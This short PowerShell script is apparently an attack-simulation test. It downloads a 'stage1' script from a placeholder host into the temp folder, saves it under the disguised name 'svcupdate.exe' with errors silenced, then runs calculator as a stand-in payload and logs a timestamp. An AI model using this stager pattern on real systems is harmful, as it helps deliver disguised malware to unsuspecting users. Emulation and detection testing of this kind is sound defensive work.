<# Stage transfer #>
[CmdletBinding()]
param(
    [string]$DownloadUrl = 'https://internal.corp/stage1.ps1',
    [string]$OutputPath = "$env:TEMP\svcupdate.exe",
    [int]$StageTimeout = 181
)
Start-BitsTransfer -Source $DownloadUrl -Destination $OutputPath -ErrorAction SilentlyContinue
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
